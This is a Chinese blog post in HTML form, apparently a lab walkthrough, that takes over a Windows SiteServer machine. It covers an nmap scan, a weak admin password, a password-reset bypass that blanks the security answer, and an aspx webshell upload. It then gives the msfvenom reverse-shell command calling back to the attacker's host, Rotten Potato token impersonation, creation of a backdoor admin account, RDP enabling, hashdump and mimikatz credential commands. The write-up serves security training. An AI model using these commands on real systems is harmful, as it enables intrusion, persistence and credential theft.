@@ -1,0 +1,108 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="一、首先先把这个机器的ip地址扫出来才能进行后续操作  可以用nmap 192.168.xx.0&#x2F;24扫描也可以用这个进行扫描。按理说nmap更专业一点，我属于是有点毛病了，但是nmap会扫出来很多，这个扫出来的会比较少（找的时候会容易，我也不知道为啥会少）用nmap的也就是挨个去试扫出来的IP，不知道密码的靶场肯定就得玩文件上传了。 二.找到文件上传的地方 涉及到网址的话，就把Burp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验一">
+<meta property="og:url" content="http://example.com/2022/06/20/%E5%AE%9E%E9%AA%8C%E4%B8%80/index.html">
+<meta property="og:site_name" content="懒大王的主场">
+<meta property="og:description" content="一、首先先把这个机器的ip地址扫出来才能进行后续操作  可以用nmap 192.168.xx.0&#x2F;24扫描也可以用这个进行扫描。按理说nmap更专业一点，我属于是有点毛病了，但是nmap会扫出来很多，这个扫出来的会比较少（找的时候会容易，我也不知道为啥会少）用nmap的也就是挨个去试扫出来的IP，不知道密码的靶场肯定就得玩文件上传了。 二.找到文件上传的地方 涉及到网址的话，就把Burp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva3.sinaimg.cn/bmiddle/008gHraJly8h3f1iy92s9j30jn0c2dgs.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h3f1nhpdogj30my0c676o.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/008gHraJly8h3f1p592a3j30st0f7dgj.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h3f1uzlu9fj30tt0erdhv.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h3f1ybq2n2j30pd0avwh9.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h3f213twmmj30bm0akglz.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h3f24o7lusj30h200nwec.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h3f2ibq40kj30d60pdgo9.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h3f3r4esoqj30tu047my9.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/008gHraJly8h3f3ttbti8j30ky062my8.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h3f3wdy690j30kn08975s.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h3f3xoxp0cj30l703s75d.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h3f44dw47qj30k3055gm8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h3f4i5kh1aj30ob07l78q.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h3f4jschlpj30oj08gq3i.jpg">
+<meta property="article:published_time" content="2022-06-20T13:16:05.000Z">
+<meta property="article:modified_time" content="2022-06-20T16:06:44.075Z">
+<meta property="article:author" content="Sanyer">
+<meta property="article:tag" content="实验一">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva3.sinaimg.cn/bmiddle/008gHraJly8h3f1iy92s9j30jn0c2dgs.jpg"><title>实验一 | 懒大王的主场</title><link ref="canonical" href="http://example.com/2022/06/20/%E5%AE%9E%E9%AA%8C%E4%B8%80/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">懒大王的主场</div><div class="header-banner-info__subtitle">懒大王专场，舔羊勿进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">实验一</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-06-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-06-21</span></span></div></header><div class="post-body"><p><strong>一、首先先把这个机器的ip地址扫出来才能进行后续操作</strong></p>
+<p><img src="https://tva3.sinaimg.cn/bmiddle/008gHraJly8h3f1iy92s9j30jn0c2dgs.jpg" alt="img"></p>
+<p>可以用nmap 192.168.xx.0&#x2F;24扫描也可以用这个进行扫描。按理说nmap更专业一点，我属于是有点毛病了，但是nmap会扫出来很多，这个扫出来的会比较少（找的时候会容易，我也不知道为啥会少）用nmap的也就是挨个去试扫出来的IP，不知道密码的靶场肯定就得玩文件上传了。</p>
+<p>二.<strong>找到文件上传的地方</strong></p>
+<p>涉及到网址的话，就把Burpsuite打开就行了。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f1nhpdogj30my0c676o.jpg" alt="img"></p>
+<p>进网站之后会发现这些东西，能看懂的就看，看不懂的就点击就好了，</p>
+<p>首先我们看到了一个user什么玩意，用户使用的地方有可能存在问题。</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3f1p592a3j30st0f7dgj.jpg" alt="img"></p>
+<p>点完之后果然到了一个登录界面，我们会发现他是有验证码的。那我们很明显不是很好去爆破，那我们先去猜一两个试一试，不行果断放弃之间注册一个账户看看。</p>
+<p>登录之后会发现有一个东西叫做更换头像。欸。。。是不是很兴奋，但是经过操作，我并没有成功上传上去。然后sql注入我也并没有发现，所以就不在这浪费时间了。从这个页面退出去，进入SiteServer。</p>
+<p>我们发现这是一个管理员后台，瞬间兴奋。尝试猜密码<img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f1uzlu9fj30tt0erdhv.jpg" alt="img"></p>
+<p>我运气不好，猜了两次没猜对。很难受，但其实很好猜，就是admin123.如果猜对的话就巨省事，这里是有这么一个弱口令和业务逻辑漏洞的。</p>
+<p>我们点击忘记密码，输入admin后他让回答问题那我们肯定不知道回答啥啊。</p>
+<p>我们在这里进行抓包</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3f1ybq2n2j30pd0avwh9.jpg" alt="img"></p>
+<p>这里会有一个answer，其实在之前的猜测过程中，发现这里其实是不能为空的，他要求必须填。那么我们是不是把answer变成空的时候就能成功呢？注意是<strong>空</strong>不是<strong>空格</strong>就直接把输入的东西删掉。</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h3f213twmmj30bm0akglz.jpg" alt="img"></p>
+<p>发现这个东西就出来了，登录就好了。进入之后就一顿乱找，发现一个叫做<strong>“站点模板管理”</strong>就很熟悉。我们尝试把webshell打成压缩包进行上传。</p>
+<p>（注意webshell的格式，这个网站的后缀都是aspx所以一定要用蚁剑生成aspx的shell，不然传上php也没用）</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f24o7lusj30h200nwec.jpg" alt="img"></p>
+<p>上传的时候我们要抓一下包，看看能不能找到上传路径，找到绝对目录的话就会很舒服。发现并没有直接告诉存在哪里。但是他这个referer就很可以，这个名字太长了感觉很可能就是upload到这个文件。</p>
+<p>我们去寻找<img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f2ibq40kj30d60pdgo9.jpg" alt="img"></p>
+<p>在我找了许久之后发现，这里居然有个站点文件管理。这不是纯纯的自爆了嘛，直接找到上传的shell1和shell2（找不到就又传了一个瞅瞅有没有路径）</p>
+<p>这个蚁剑生成的shell有点毛病，用不太明白，直接搜一个一句话比较舒服。换完shell成功登录。</p>
+<p><strong>三、提权与获取密码</strong></p>
+<p>利用虚拟终端发现权限是nt authority\network service，这啥用没有，就得提权了。</p>
+<p>利用msf生成木马，msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;kail的ip地址 LPORT&#x3D;4444 -f exe -o hackshell.exe</p>
+<p>通过webshell将这个木马上传，然后开启msf的监听</p>
+<p>msfconsole；use exploit&#x2F;multi&#x2F;handle；SET LHOST kail的IP；SET PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp；exploit；</p>
+<p>依次执行上面的命令，然后就开启了监听。</p>
+<p>通过webshell的虚拟终端，输入hackshell.exe启动木马</p>
+<p>发现kail有回显。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f3r4esoqj30tu047my9.jpg" alt="img"></p>
+<p>在这里我们使用烂土豆进行提权，其他也行但是我找了好久也没找到好用的。烂土豆对这个机器有奇效，</p>
+<p>我们先use incognito然后才能调用一些命令。之后通过list_tokens -u看一下有哪些令牌。发现一个比一个惨，权限低的都可怜</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h3f3ttbti8j30ky062my8.jpg" alt="img"></p>
+<p>execute -c -H -f .&#x2F;potato.exe运行烂土豆</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f3wdy690j30kn08975s.jpg" alt="img"></p>
+<p>再次查看令牌，system出来了，直接模仿impersonate_token “NT AUTHORITY\SYSTEM”</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f3xoxp0cj30l703s75d.jpg" alt="img"></p>
+<p>getuid后发现，已经是SYSTEM权限了，接下来就可以为所欲为了。</p>
+<p>输入shell，进入cmd。使用net user mybb 123.qqq &#x2F;add创建一个为mybb密码为123.qqq的用户，别问为啥是123.qqq因为他的密码规则要求复杂。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f44dw47qj30k3055gm8.jpg" alt="img"></p>
+<p>net user 看一下新建的账户，我就想知道，这个🐕东西到底对这个电脑做了什么，怎么这么多用户。</p>
+<p>net localgroup administrators mybb &#x2F;add 把新建的用户变成管理员。</p>
+<p>输入exit从cmd退出来，输入run getgui -e开启3389端口。我们尝试进行远程连接，发现连不上。</p>
+<p>发现他是有域的，需要在账户名前面加上W80ms&#x2F;变成W80ms&#x2F;mybb，然后输入密码就能上去了。</p>
+<p>hash也好拿，直接通过msf输入hashdump，全部拿下。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h3f4i5kh1aj30ob07l78q.jpg" alt="img"></p>
+<p>然后把administrator的后半截拿下来afffeba176210fad4628f0524bfe1942，上网cmd5解密。直接得出密码为123.com</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h3f4jschlpj30oj08gq3i.jpg" alt="img"></p>
+<p>kiwi_cmd “privilege:debug” “sekurlsa::logonpasswords”</p>
+<p>creds_all</p>
+<p>在msf中利用这两个发现根本跑不出来明文密码，</p>
+<p>因为那个Administration账户并没有进行过登录，所以无法拿到明文密码，只有登录过的账户才有可能抓取到明文密码</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E5%AE%9E%E9%AA%8C%E4%B8%80/">实验一</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/06/22/%E5%AE%9E%E9%AA%8C%E4%BA%8C/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">实验二</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/04/21/xsslabs/"><span class="paginator-prev__text">xsslabs</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.png" alt="avatar"></div><p class="sidebar-ov-author__text">世间本浑浊，罪与爱同歌</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">35</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sanyer</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
